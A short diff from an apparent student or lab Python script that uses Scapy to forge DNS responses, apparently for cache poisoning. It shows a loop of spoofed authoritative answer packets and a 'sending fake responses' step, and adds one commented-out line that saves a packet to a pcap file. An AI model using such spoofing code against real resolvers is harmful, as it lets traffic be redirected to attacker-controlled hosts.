@@ -163,6 +163,7 @@ def bite_the_rat():
                              DNS(id=query_id, qd=dns_record_req, qr=1, aa=1, ra=0, ar=dns_additional_answer,
                                  an=dns_authoritative_answer))
         payloaded_packets.append(attack_res_packet)
+    # wrpcap('attack_example.pcap', payloaded_packets[0]) # just used for the final relation
     print(BITE_THE_RAT_HEADER + "Attack packets created! Sending request and fake responses...")
     j = 1
     while ATTACK_GOING_ON:
